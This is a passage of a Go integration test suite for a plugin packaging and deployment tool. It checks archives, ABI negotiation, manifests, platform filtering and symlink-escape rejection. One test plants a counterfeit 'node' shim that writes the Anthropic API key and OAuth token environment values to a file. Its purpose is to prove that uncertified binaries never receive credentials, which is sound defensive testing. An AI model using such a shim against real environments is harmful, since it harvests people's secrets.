//go:build integration

package tools_test

import (
	"bufio"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	backendpluginv1 "github.com/aiproxer/aiproxer/api/backendplugin/v1"
	"github.com/aiproxer/aiproxer/internal/core/modelregistry"
	"github.com/aiproxer/aiproxer/internal/infra/backendplugins/manifest"
	"github.com/aiproxer/aiproxer/internal/standardplugins"
	"github.com/aiproxer/aiproxer/pkg/aipsdk/modelinventory"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
)

// Task 3.3: test the real release seam, archive, deployed process and ABI. The
// optional exact-runtime check uses only a synthetic key and version probes;
// no prompt, credential store or provider request is involved.
func TestPackage_ClaudeACPArchiveDeployment(t *testing.T) {
	t.Parallel()
	if runtime.GOOS != "linux" || runtime.GOARCH != "amd64" {
		t.Skip("only Linux/amd64 is runtime-certified")
	}
	root, dest, deployed := repoRoot(t), t.TempDir(), t.TempDir()
	runTool(t, root, "./tools/backendplugin/package_plugins", "-root", root, "-profile", "full", "-dest", dest, "-select", "claudeagentacp")
	archive := filepath.Join(t.TempDir(), "claudeagentacp.tar.gz")
	ctx, cancel := context.WithTimeout(t.Context(), 4*time.Minute)
	defer cancel()
	for _, args := range [][]string{{"-czf", archive, "-C", dest, "claudeagentacp"}, {"-xzf", archive, "-C", deployed}} {
		if out, err := exec.CommandContext(ctx, "tar", args...).CombinedOutput(); err != nil {
			t.Fatalf("archive: %v\n%s", err, out)
		}
	}
	bin := filepath.Join(deployed, "claudeagentacp", "bin")
	for _, name := range []string{"bootstrap.mjs", "identity.mjs", "models.mjs"} {
		path := filepath.Join(bin, "claudeagentacp-adapter-extension", name)
		if fileDigest(t, path) != fileDigest(t, filepath.Join(root, "connectors", "claudeagentacp", "adapter-extension", name)) {
			t.Fatalf("archive changed %s", name)
		}
	}
	if err := filepath.WalkDir(deployed, func(path string, d os.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if d.Name() == "node_modules" || strings.HasSuffix(d.Name(), ".test.mjs") {
			return fmt.Errorf("undeclared upstream/test payload: %s", path)
		}
		return nil
	}); err != nil {
		t.Fatal(err)
	}
	cmd := exec.CommandContext(ctx, filepath.Join(bin, "aip-backend-claudeagentacp"))
	nodeDir := t.TempDir()
	node, err := exec.LookPath("node")
	if err != nil {
		t.Fatal("deployment test requires Node")
	}
	node, err = filepath.Abs(node)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(node, filepath.Join(nodeDir, "node")); err != nil {
		t.Fatal(err)
	}
	// Explicit clean environment: never inherit real credentials or loader flags.
	cmd.Env = []string{"PATH=" + nodeDir + ":" + os.Getenv("PATH"), "HOME=" + t.TempDir(), "TMPDIR=" + os.TempDir()}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		t.Fatal(err)
	}
	if err := cmd.Start(); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = cmd.Process.Kill(); _ = cmd.Wait() })
	ready := make(chan string, 1)
	go func() {
		scanner := bufio.NewScanner(stderr)
		if scanner.Scan() {
			ready <- scanner.Text()
		} else {
			ready <- ""
		}
	}()
	var address string
	select {
	case line := <-ready:
		_, address, _ = strings.Cut(line, " listening on ")
	case <-ctx.Done():
		t.Fatal("deployed connector did not start")
	}
	if address == "" {
		t.Fatal("no deployed ABI address")
	}
	conn, err := grpc.NewClient(address, grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = conn.Close() })
	client := backendpluginv1.NewBackendPluginClient(conn)
	neg, err := client.Negotiate(ctx, &backendpluginv1.NegotiateRequest{HostMajor: 1, DisableTransportRetries: true})
	if err != nil || !neg.GetCompatible() || neg.GetNegotiationToken() == "" {
		t.Fatalf("deployed negotiation: %v, %v", neg, err)
	}
	desc, err := client.Describe(ctx, &backendpluginv1.DescribeRequest{})
	if err != nil {
		t.Fatal(err)
	}
	factories := desc.GetDescriptor_().GetFactories()
	if len(factories) != 1 || factories[0].GetKind() != "claudeagentacp" || factories[0].GetAccessScope() != backendpluginv1.AccessScope_ACCESS_SCOPE_LOCAL_ONLY || standardplugins.HostMultiUserBackendPolicy().IsApproved(factories[0].GetKind()) {
		t.Fatalf("deployed host posture: %v", factories)
	}
	factory := factories[0]
	if !factory.GetSupportsDynamicInventory() || factory.GetDescription() != "Local Claude Agent ACP connector; model namespace anthropic/" || strings.Join(factory.GetRoutePrefixes(), ",") != "claudeagentacp" {
		t.Fatalf("deployed discovery descriptor: %v", factory)
	}
	raw, err := os.ReadFile(filepath.Join(deployed, "claudeagentacp", "plugin.backendplugin.json"))
	if err != nil {
		t.Fatal(err)
	}
	packaged, err := manifest.ParseStrictBytes(raw)
	if err != nil {
		t.Fatal(err)
	}
	if packaged.PluginID != desc.GetDescriptor_().GetPluginId() || len(packaged.Exports) != 1 {
		t.Fatalf("packaged descriptor identity: %+v", packaged)
	}
	export := packaged.Exports[0]
	if export.Kind != factory.GetKind() || export.CredentialMode != "static" || factory.GetCredentialMode() != backendpluginv1.CredentialMode_CREDENTIAL_MODE_STATIC || export.AccessScope != "local_only" || export.ProcessSharing != "per_instance" || factory.GetProcessSharing() != backendpluginv1.ProcessSharing_PROCESS_SHARING_PER_INSTANCE || export.ExecutionClass != "agent_runtime" || export.Experimental != factory.GetExperimental() {
		t.Fatalf("packaged/runtime posture mismatch: %+v / %v", export, factory)
	}
	// The host validates canonical namespaces independently of route/factory
	// prefixes. Arbitrary discovered identities must not be rewritten or omitted.
	canonical, native := "anthropic/claude-novel-17.8-20990101", "claude-novel-17-8-20990101"
	inventory, err := modelregistry.Build(ctx, []modelregistry.BackendInventory{{
		BackendID: "claude-acp", Kind: factory.GetKind(), BackendPrefixes: factory.GetRoutePrefixes(),
		Provider: modelinventory.StaticProvider{Source: modelinventory.SourceRemote, Models: []modelinventory.Model{{CanonicalID: canonical, NativeID: native}}},
	}}, nil)
	if err != nil {
		t.Fatal(err)
	}
	rows, ok := inventory.Registry.Lookup(canonical)
	if !ok || len(rows) != 1 || rows[0].BackendID != "claude-acp" || rows[0].Kind != factory.GetKind() || rows[0].NativeID != native || len(inventory.Discoveries) != 1 || inventory.Discoveries[0].Status != modelinventory.DiscoveryStatusOK {
		t.Fatalf("host omitted or changed canonical/native discovery: %+v", inventory)
	}
	adapter := os.Getenv("AIP_CLAUDE_ACP_TEST_ADAPTER")
	if adapter == "" {
		t.Log("exact runtime deployment checks omitted; set AIP_CLAUDE_ACP_TEST_ADAPTER to the certified operator installation")
		return
	}
	// Claim: stock discovery carries the operator's non-secret launch context.
	// The direct ABI launch above is not evidence for the stock host boundary.
	host := filepath.Join(t.TempDir(), "aipstd")
	build := exec.CommandContext(ctx, "go", "build", "-o", host, "./cmd/aipstd")
	build.Dir = root
	if out, err := build.CombinedOutput(); err != nil {
		t.Fatalf("build stock host: %v\n%s", err, out)
	}
	for _, source := range []string{"api_key", "subscription_token", "host_login"} {
		t.Run("stock_"+source+"_configure", func(t *testing.T) {
			// A held port makes serve terminate after successful Configure, without
			// sleeps, readiness polling, prompts or a second process cleanup owner.
			listener, err := net.Listen("tcp", "127.0.0.1:0")
			if err != nil {
				t.Fatal(err)
			}
			defer func() { _ = listener.Close() }()
			home, configDir := t.TempDir(), t.TempDir()
			refs := ""
			if source != "host_login" {
				name := "api_key"
				if source == "subscription_token" {
					name = "claude_oauth_token"
				}
				refs = fmt.Sprintf("        secret_refs: {%s: {env: STOCK_CREDENTIAL_REF}}\n", name)
			}
			config := fmt.Sprintf(`server:
  address: %q
  auth_mode: external
access:
  mode: single_user
auth:
  handler: local_api_key
  required_level: api_key
  local_api_keys:
    - key_id: synthetic-stock
      principal_id: synthetic-stock
      key: synthetic-stock-not-a-real-key
continuity:
  in_memory: true
plugins:
  backend_discovery:
    enabled: true
    strict: true
    paths: [%q]
    instances:
      stock-claude:
        kind: claudeagentacp
        execution_env: [HOME, PATH, TMPDIR, CLAUDE_CONFIG_DIR]
%s
  backends:
    - id: stock-claude
      kind: claudeagentacp
      enabled: true
      config:
        credential_source: %s
        admin_policy: honor
        executable: %q
        default_workspace: %q
`, listener.Addr().String(), filepath.Join(deployed, "claudeagentacp"), refs, source, adapter, home)
			configPath := filepath.Join(t.TempDir(), "stock.yaml")
			if err := os.WriteFile(configPath, []byte(config), 0o600); err != nil {
				t.Fatal(err)
			}
			stock := exec.CommandContext(ctx, host, "serve", "--config", configPath)
			// Only the root host gets synthetic operator context; no connector env
			// injection, host credential directory, loader flags or provider overrides.
			stock.Env = []string{"HOME=" + home, "CLAUDE_CONFIG_DIR=" + configDir, "PATH=" + nodeDir, "TMPDIR=" + os.TempDir(), "STOCK_CREDENTIAL_REF=synthetic-stock-credential"}
			out, err := stock.CombinedOutput()
			if err == nil || !strings.Contains(string(out), "address already in use") || strings.Contains(string(out), "bootstrap failed") {
				t.Fatalf("stock host must Configure before the intentional bind refusal: %v\n%s", err, out)
			}
			doctor := exec.CommandContext(ctx, host, "doctor", "--instance", "stock-claude", "--config", configPath)
			doctor.Env = append([]string(nil), stock.Env...)
			out, err = doctor.CombinedOutput()
			if err != nil || !strings.Contains(string(out), "peer-authenticated and configured") || strings.Contains(string(out), "synthetic-stock-credential") {
				t.Fatalf("selected stock doctor: %v\n%s", err, out)
			}
		})
	}
	nextInstance := 0
	configure := func(want string) {
		t.Helper()
		nextInstance++
		neg, err := client.Negotiate(ctx, &backendpluginv1.NegotiateRequest{HostMajor: 1, DisableTransportRetries: true})
		if err != nil {
			t.Fatal(err)
		}
		yaml := fmt.Sprintf("executable: %q\ncredential_source: api_key\nadmin_policy: honor\npermission_policy: deny\n", adapter)
		response, err := client.Configure(ctx, &backendpluginv1.ConfigureRequest{InstanceId: fmt.Sprintf("deployment-%d", nextInstance), FactoryKind: "claudeagentacp", NegotiationToken: neg.GetNegotiationToken(), RuntimePolicy: &backendpluginv1.RuntimePolicy{DisableTransportRetries: true}, ConfigYaml: []byte(yaml), Secrets: &backendpluginv1.SecretBundle{Values: map[string][]byte{"api_key": []byte("synthetic-deployment-test")}}})
		if want == "" {
			if err != nil {
				t.Fatalf("exact deployed closure: %v", err)
			}
			if response == nil {
				t.Fatal("nil configured response")
			}
			if _, err := client.CloseInstance(ctx, &backendpluginv1.CloseInstanceRequest{InstanceId: fmt.Sprintf("deployment-%d", nextInstance)}); err != nil {
				t.Fatal(err)
			}
			return
		}
		if err == nil || !strings.Contains(err.Error(), want) {
			t.Fatalf("deployed rejection = %v, want %q", err, want)
		}
	}
	configure("")
	if err := os.Remove(filepath.Join(nodeDir, "node")); err != nil {
		t.Fatal(err)
	}
	nodeMarker := filepath.Join(t.TempDir(), "counterfeit-node-executed")
	credentialMarker := filepath.Join(t.TempDir(), "counterfeit-node-credential")
	// Even an adapter --version shebang must never launch uncertified Node with
	// the prepared synthetic credential. Delegation preserves valid version output.
	body := "#!/bin/sh\nprintf executed > " + strconv.Quote(nodeMarker) + "\nprintf '%s' \"$ANTHROPIC_API_KEY$CLAUDE_CODE_OAUTH_TOKEN\" > " + strconv.Quote(credentialMarker) + "\nexec " + strconv.Quote(node) + " \"$@\"\n"
	if err := os.WriteFile(filepath.Join(nodeDir, "node"), []byte(body), 0o755); err != nil {
		t.Fatal(err)
	}
	configure("not certified")
	for _, marker := range []string{nodeMarker, credentialMarker} {
		if _, err := os.Stat(marker); !os.IsNotExist(err) {
			t.Fatal("uncertified Node ran before adapter/Node version admission")
		}
	}
	if err := os.Remove(filepath.Join(nodeDir, "node")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(node, filepath.Join(nodeDir, "node")); err != nil {
		t.Fatal(err)
	}
	for _, name := range []string{"bootstrap.mjs", "identity.mjs", "models.mjs"} {
		sidecar := filepath.Join(bin, "claudeagentacp-adapter-extension", name)
		original, err := os.ReadFile(sidecar)
		if err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(sidecar, []byte("changed closure"), 0o644); err != nil {
			t.Fatal(err)
		}
		configure("not certified")
		if err := os.Remove(sidecar); err != nil {
			t.Fatal(err)
		}
		configure("sidecar missing")
		if err := os.WriteFile(sidecar, original, 0o644); err != nil {
			t.Fatal(err)
		}
	}
}

//nolint:paralleltest // writes synthetic fixtures under a private temp root
func TestDiscoverModules_StructuralAndSynthetic(t *testing.T) {
	root := isolatedConnectorRoot(t)
	seedRealConnector(t, root, "localstub")
	out := runTool(t, root, "./tools/backendplugin/discover_modules", "-root", root)
	if !strings.Contains(out, "connectors/localstub") {
		t.Fatalf("expected localstub, got %q", out)
	}
	syn := filepath.Join(root, "connectors", "_synthetic_discover_probe")
	if err := os.MkdirAll(syn, 0o755); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(syn) })
	if err := os.WriteFile(filepath.Join(syn, "go.mod"), []byte("module example.com/synthetic\n\ngo 1.26.5\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	out2 := runTool(t, root, "./tools/backendplugin/discover_modules", "-root", root)
	if !strings.Contains(out2, "connectors/_synthetic_discover_probe") {
		t.Fatalf("synthetic not discovered: %q", out2)
	}
}

func TestPackage_MinimalHasNoOptionalExecutable(t *testing.T) {
	t.Parallel()
	root := repoRoot(t)
	dest := t.TempDir()
	runTool(t, root, "./tools/backendplugin/package_plugins", "-root", root, "-profile", "minimal", "-dest", dest)
	idx := readIndex(t, dest)
	plugins, _ := idx["plugins"].([]any)
	if len(plugins) != 0 {
		t.Fatalf("minimal plugins=%v", plugins)
	}
}

//nolint:paralleltest // writes synthetic fixtures under a private temp root
func TestPackage_OmitsUnsupportedNativePlatform_MixedSelect(t *testing.T) {
	root := isolatedConnectorRoot(t)
	supportedName := "_synthetic_pkg_native_ok"
	unsupportedName := "_synthetic_pkg_native_skip"
	supported := filepath.Join(root, "connectors", supportedName)
	unsupported := filepath.Join(root, "connectors", unsupportedName)
	t.Cleanup(func() {
		_ = os.RemoveAll(supported)
		_ = os.RemoveAll(unsupported)
	})
	writeSyntheticConnectorWithPlatforms(t, supported, supportedName, []string{"private/note.txt"}, []platformSpec{
		{OS: runtime.GOOS, Arch: runtime.GOARCH},
		{OS: "linux", Arch: "amd64"},
	}, func(connRoot string) {
		if err := os.WriteFile(filepath.Join(connRoot, "private", "note.txt"), []byte("private\n"), 0o644); err != nil {
			t.Fatal(err)
		}
	})
	writeSyntheticConnectorWithPlatforms(t, unsupported, unsupportedName, []string{"private/note.txt"}, []platformSpec{
		{OS: "plan9", Arch: "amd64"},
	}, func(connRoot string) {
		if err := os.WriteFile(filepath.Join(connRoot, "private", "note.txt"), []byte("private\n"), 0o644); err != nil {
			t.Fatal(err)
		}
	})
	dest := t.TempDir()
	runTool(t, root, "./tools/backendplugin/package_plugins",
		"-root", root, "-profile", "full", "-dest", dest,
		"-select", supportedName+","+unsupportedName)
	idx := readIndex(t, dest)
	plugins, _ := idx["plugins"].([]any)
	paths := map[string]bool{}
	for _, p := range plugins {
		m, ok := p.(map[string]any)
		if !ok {
			t.Fatalf("plugin entry type %T", p)
		}
		path, ok := m["path"].(string)
		if !ok {
			t.Fatalf("plugin path type %T", m["path"])
		}
		paths[path] = true
	}
	if !paths[supportedName] {
		t.Fatalf("native-supported connector missing from package: %v", paths)
	}
	if paths[unsupportedName] {
		t.Fatalf("unsupported connector must be omitted from package-index: %v", paths)
	}
	if _, err := os.Stat(filepath.Join(dest, unsupportedName)); err == nil {
		t.Fatal("unsupported connector must not leave package artifacts")
	}
	if _, err := os.Stat(filepath.Join(dest, supportedName, "plugin.backendplugin.json")); err != nil {
		t.Fatal(err)
	}
}

//nolint:paralleltest // writes synthetic fixtures under a private temp root
func TestPackage_ExplicitSelectUnsupportedYieldsEmptyPackage(t *testing.T) {
	root := isolatedConnectorRoot(t)
	name := "_synthetic_pkg_select_unsupported"
	syn := filepath.Join(root, "connectors", name)
	t.Cleanup(func() { _ = os.RemoveAll(syn) })
	writeSyntheticConnectorWithPlatforms(t, syn, name, []string{"private/note.txt"}, []platformSpec{
		{OS: "plan9", Arch: "amd64"},
	}, func(connRoot string) {
		if err := os.WriteFile(filepath.Join(connRoot, "private", "note.txt"), []byte("private\n"), 0o644); err != nil {
			t.Fatal(err)
		}
	})
	dest := t.TempDir()
	runTool(t, root, "./tools/backendplugin/package_plugins",
		"-root", root, "-profile", "full", "-dest", dest, "-select", name)
	idx := readIndex(t, dest)
	plugins, _ := idx["plugins"].([]any)
	if len(plugins) != 0 {
		t.Fatalf("explicit -select of unsupported connectors must yield empty package, got %v", plugins)
	}
	if _, err := os.Stat(filepath.Join(dest, name)); err == nil {
		t.Fatal("unsupported selection must not build or stage connector artifacts")
	}
	if _, err := os.Stat(filepath.Join(dest, "package-index.json")); err != nil {
		t.Fatal("empty package must still write package-index.json")
	}
	if _, err := os.Stat(filepath.Join(dest, "ACCESS.txt")); err != nil {
		t.Fatal("empty package must still write ACCESS.txt")
	}
}

//nolint:paralleltest // writes staging under a private temp root
func TestPackage_FullRelativeDestPlacesExecutable(t *testing.T) {
	root := isolatedConnectorRoot(t)
	seedRealConnector(t, root, "localstub")
	requireNativeClaimedConnector(t, root, "localstub")
	relDest := filepath.Join(".aip-package-staging-test", "full-rel")
	absDest := filepath.Join(root, relDest)
	_ = os.RemoveAll(absDest)
	t.Cleanup(func() { _ = os.RemoveAll(filepath.Join(root, ".aip-package-staging-test")) })
	runTool(t, root, "./tools/backendplugin/package_plugins", "-root", root, "-profile", "full", "-dest", relDest, "-select", "localstub")
	exe := filepath.Join(absDest, "localstub", "bin", "aip-backend-localstub")
	if runtime.GOOS == "windows" {
		exe += ".exe"
	}
	if _, err := os.Stat(exe); err != nil {
		t.Fatalf("relative -dest must write exe under repo dest: %v", err)
	}
}

func TestPackage_FullInstallLayoutDigestAndRemoval(t *testing.T) {
	t.Parallel()
	root := isolatedConnectorRoot(t)
	seedRealConnector(t, root, "localstub")
	requireNativeClaimedConnector(t, root, "localstub")
	dest := t.TempDir()
	runTool(t, root, "./tools/backendplugin/package_plugins", "-root", root, "-profile", "full", "-dest", dest, "-select", "localstub")
	idx := readIndex(t, dest)
	plugins, _ := idx["plugins"].([]any)
	if len(plugins) < 1 {
		t.Fatalf("full plugins=%v", plugins)
	}
	var local map[string]any
	for _, p := range plugins {
		m, ok := p.(map[string]any)
		if !ok {
			t.Fatalf("plugin entry type %T", p)
		}
		if m["path"] == "localstub" {
			local = m
			break
		}
	}
	if local == nil {
		t.Fatalf("localstub missing from index: %v", plugins)
	}
	exe := filepath.Join(dest, "localstub", "bin", "aip-backend-localstub")
	if runtime.GOOS == "windows" {
		exe += ".exe"
	}
	if _, err := os.Stat(exe); err != nil {
		t.Fatal(err)
	}
	manPath := filepath.Join(dest, "localstub", "plugin.backendplugin.json")
	if _, err := os.Stat(manPath); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(filepath.Join(dest, "localstub", "private", "bridge-note.txt")); err != nil {
		t.Fatal(err)
	}
	access, err := os.ReadFile(filepath.Join(dest, "ACCESS.txt"))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(access), "proxy: read,execute") || !strings.Contains(string(access), "runtime_acl: unverified_on_agent") {
		t.Fatalf("ACCESS.txt=%s", access)
	}
	exeDig := fileDigest(t, exe)
	manDig := fileDigest(t, manPath)
	if local["digest"] != exeDig {
		t.Fatalf("index digest=%v want exe %s", local["digest"], exeDig)
	}
	if local["manifest_digest"] != manDig {
		t.Fatalf("manifest_digest=%v want %s", local["manifest_digest"], manDig)
	}
	for _, key := range []string{"plugin_id", "version", "tag", "platform", "install_root", "access"} {
		if local[key] == nil || local[key] == "" {
			t.Fatalf("index entry missing %s: %#v", key, local)
		}
	}
	manBody, err := os.ReadFile(manPath)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(manBody), exeDig) {
		t.Fatal("manifest sha256 must match executable digest")
	}
	if err := os.RemoveAll(filepath.Join(dest, "localstub")); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(filepath.Join(dest, "package-index.json")); err != nil {
		t.Fatal("index must remain after plugin dir removal")
	}
}

//nolint:paralleltest // writes synthetic fixtures under a private temp root
func TestPackage_SyntheticReleaseAutoPackagedAndRemovalLeavesOther(t *testing.T) {
	root := isolatedConnectorRoot(t)
	seedRealConnector(t, root, "localstub")
	synName := "_synthetic_pkg_probe"
	syn := filepath.Join(root, "connectors", synName)
	t.Cleanup(func() { _ = os.RemoveAll(syn) })
	writeSyntheticConnector(t, syn, synName)
	dest := t.TempDir()
	runTool(t, root, "./tools/backendplugin/package_plugins", "-root", root, "-profile", "full", "-dest", dest, "-select", "localstub,"+synName)
	idx := readIndex(t, dest)
	plugins, _ := idx["plugins"].([]any)
	paths := map[string]bool{}
	for _, p := range plugins {
		m, ok := p.(map[string]any)
		if !ok {
			t.Fatalf("plugin entry type %T", p)
		}
		path, ok := m["path"].(string)
		if !ok {
			t.Fatalf("plugin path type %T", m["path"])
		}
		paths[path] = true
	}
	if !paths[synName] {
		t.Fatalf("expected synthetic %s in package, got %v", synName, paths)
	}
	if connectorClaimsNative(t, root, "localstub") && !paths["localstub"] {
		t.Fatalf("expected localstub+%s, got %v", synName, paths)
	}
	if err := os.RemoveAll(filepath.Join(dest, synName)); err != nil {
		t.Fatal(err)
	}
	if connectorClaimsNative(t, root, "localstub") {
		if _, err := os.Stat(filepath.Join(dest, "localstub", "plugin.backendplugin.json")); err != nil {
			t.Fatal("removing synthetic must leave localstub")
		}
	}
	if _, err := os.Stat(filepath.Join(dest, "package-index.json")); err != nil {
		t.Fatal("index must remain")
	}
}

//nolint:paralleltest // writes synthetic fixtures under a private temp root
func TestPackage_PrivateCompanionsExplicitFile(t *testing.T) {
	root := isolatedConnectorRoot(t)
	synName := "_synthetic_companion_file"
	syn := filepath.Join(root, "connectors", synName)
	t.Cleanup(func() { _ = os.RemoveAll(syn) })
	writeSyntheticConnectorWithCompanions(t, syn, synName, []string{"private/note.txt"}, func(connRoot string) {
		if err := os.WriteFile(filepath.Join(connRoot, "private", "note.txt"), []byte("private-file\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(connRoot, "unrelated.txt"), []byte("must-not-pack\n"), 0o644); err != nil {
			t.Fatal(err)
		}
	})
	dest := t.TempDir()
	runTool(t, root, "./tools/backendplugin/package_plugins", "-root", root, "-profile", "full", "-dest", dest, "-select", synName)
	got, err := os.ReadFile(filepath.Join(dest, synName, "private", "note.txt"))
	if err != nil {
		t.Fatal(err)
	}
	if string(got) != "private-file\n" {
		t.Fatalf("companion file=%q", got)
	}
	if _, err := os.Stat(filepath.Join(dest, synName, "unrelated.txt")); err == nil {
		t.Fatal("unrelated file outside declared companion must be absent")
	}
}

//nolint:paralleltest // writes synthetic fixtures under a private temp root
func TestPackage_PrivateCompanionsExplicitDirectory(t *testing.T) {
	root := isolatedConnectorRoot(t)
	synName := "_synthetic_companion_dir"
	syn := filepath.Join(root, "connectors", synName)
	t.Cleanup(func() { _ = os.RemoveAll(syn) })
	writeSyntheticConnectorWithCompanions(t, syn, synName, []string{"bridge-node"}, func(connRoot string) {
		nested := filepath.Join(connRoot, "bridge-node", "nested")
		if err := os.MkdirAll(nested, 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(nested, "asset.txt"), []byte("dir-asset\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(connRoot, "bridge-node", "top.txt"), []byte("top\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		if err := os.MkdirAll(filepath.Join(connRoot, "other-dir"), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(connRoot, "other-dir", "secret.txt"), []byte("outside\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(connRoot, "unrelated.txt"), []byte("must-not-pack\n"), 0o644); err != nil {
			t.Fatal(err)
		}
	})
	dest := t.TempDir()
	runTool(t, root, "./tools/backendplugin/package_plugins", "-root", root, "-profile", "full", "-dest", dest, "-select", synName)
	got, err := os.ReadFile(filepath.Join(dest, synName, "bridge-node", "nested", "asset.txt"))
	if err != nil {
		t.Fatal(err)
	}
	if string(got) != "dir-asset\n" {
		t.Fatalf("nested companion=%q", got)
	}
	top, err := os.ReadFile(filepath.Join(dest, synName, "bridge-node", "top.txt"))
	if err != nil {
		t.Fatal(err)
	}
	if string(top) != "top\n" {
		t.Fatalf("top companion=%q", top)
	}
	for _, rel := range []string{"unrelated.txt", filepath.Join("other-dir", "secret.txt")} {
		if _, err := os.Stat(filepath.Join(dest, synName, rel)); err == nil {
			t.Fatalf("unrelated path %q must be absent from package", rel)
		}
	}
}

//nolint:paralleltest // writes synthetic fixtures under a private temp root
func TestPackage_PrivateCompanionsNestedSymlinkEscapeRejected(t *testing.T) {
	root := isolatedConnectorRoot(t)
	synName := "_synthetic_companion_linkesc"
	syn := filepath.Join(root, "connectors", synName)
	t.Cleanup(func() { _ = os.RemoveAll(syn) })
	outside := t.TempDir()
	secret := filepath.Join(outside, "secret.txt")
	if err := os.WriteFile(secret, []byte("CONFIDENTIAL\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	writeSyntheticConnectorWithCompanions(t, syn, synName, []string{"bridge-node"}, func(connRoot string) {
		if err := os.MkdirAll(filepath.Join(connRoot, "bridge-node"), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(connRoot, "bridge-node", "ok.txt"), []byte("ok\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		link := filepath.Join(connRoot, "bridge-node", "escape.txt")
		if err := os.Symlink(secret, link); err != nil {
			t.Skipf("symlink not available: %v", err)
		}
	})
	dest := t.TempDir()
	out := runToolExpectError(t, root, "./tools/backendplugin/package_plugins", "-root", root, "-profile", "full", "-dest", dest, "-select", synName)
	if !strings.Contains(out, "escapes connector root") {
		t.Fatalf("expected nested companion symlink escape rejection, got:\n%s", out)
	}
	if _, err := os.Stat(filepath.Join(dest, synName, "bridge-node", "escape.txt")); err == nil {
		t.Fatal("escaping symlink must not be packaged")
	}
}

func TestPackage_DeterministicIndexAndDigestChangesOnRebuild(t *testing.T) {
	t.Parallel()
	root := isolatedConnectorRoot(t)
	seedRealConnector(t, root, "localstub")
	requireNativeClaimedConnector(t, root, "localstub")
	dest1 := t.TempDir()
	dest2 := t.TempDir()
	runTool(t, root, "./tools/backendplugin/package_plugins", "-root", root, "-profile", "full", "-dest", dest1, "-select", "localstub")
	runTool(t, root, "./tools/backendplugin/package_plugins", "-root", root, "-profile", "full", "-dest", dest2, "-select", "localstub")
	b1, err := os.ReadFile(filepath.Join(dest1, "package-index.json"))
	if err != nil {
		t.Fatal(err)
	}
	b2, err := os.ReadFile(filepath.Join(dest2, "package-index.json"))
	if err != nil {
		t.Fatal(err)
	}
	if string(b1) != string(b2) {
		t.Fatalf("index not deterministic\n---\n%s\n---\n%s", b1, b2)
	}
	exe := filepath.Join(dest1, "localstub", "bin", "aip-backend-localstub")
	if runtime.GOOS == "windows" {
		exe += ".exe"
	}
	before := fileDigest(t, exe)
	f, err := os.OpenFile(exe, os.O_APPEND|os.O_WRONLY, 0)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := f.WriteString("\n#mutate\n"); err != nil {
		_ = f.Close()
		t.Fatal(err)
	}
	_ = f.Close()
	after := fileDigest(t, exe)
	if before == after {
		t.Fatal("expected digest change after binary mutation")
	}
}

//nolint:paralleltest // writes synthetic fixtures under a private temp root
func TestPackage_FailedBuildLeavesPriorStagingUntouched(t *testing.T) {
	root := isolatedConnectorRoot(t)
	seedRealConnector(t, root, "localstub")
	requireNativeClaimedConnector(t, root, "localstub")
	dest := t.TempDir()
	runTool(t, root, "./tools/backendplugin/package_plugins", "-root", root, "-profile", "full", "-dest", dest, "-select", "localstub")
	marker := filepath.Join(dest, "localstub", "KEEP.txt")
	if err := os.WriteFile(marker, []byte("keep"), 0o644); err != nil {
		t.Fatal(err)
	}
	before, err := os.ReadFile(filepath.Join(dest, "package-index.json"))
	if err != nil {
		t.Fatal(err)
	}
	// Point a temporary broken release.yaml overlay by packaging a root copy is heavy;
	// instead invoke with an explicit selection of a non-buildable connector dir.
	broken := filepath.Join(root, "connectors", "_broken_pkg_probe")
	t.Cleanup(func() { _ = os.RemoveAll(broken) })
	if err := os.MkdirAll(filepath.Join(broken, "manifest"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(broken, "go.mod"), []byte("module example.com/broken\n\ngo 1.26.5\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	rel := `schema: aip.connector.release/v1
plugin_id: com.aiproxer.backend.broken
factory_kind: broken-kind
module: example.com/broken
command: ./cmd/does-not-exist
manifest_template: manifest/template.backendplugin.json
version: 0.0.1
build_id: broken
profiles:
  - full
published_root_module: github.com/aiproxer/aiproxer
replace_policy: development-replace-to-monorepo-root
`
	if err := os.WriteFile(filepath.Join(broken, "release.yaml"), []byte(rel), 0o644); err != nil {
		t.Fatal(err)
	}
	// Claim the native host so packaging attempts a build (unsupported platforms are omitted).
	man := fmt.Sprintf(`{
  "schema":"aiproxer.backendplugin.manifest/v1",
  "plugin_id":"com.aiproxer.backend.broken",
  "version":"0.0.1",
  "build_id":"REPLACE_BUILD_ID",
  "executable":"bin/x",
  "sha256":"REPLACE_SHA256",
  "protocol_major":1,
  "protocol_min_minor":0,
  "protocol_max_minor":0,
  "platforms":[{"os":%q,"arch":%q}],
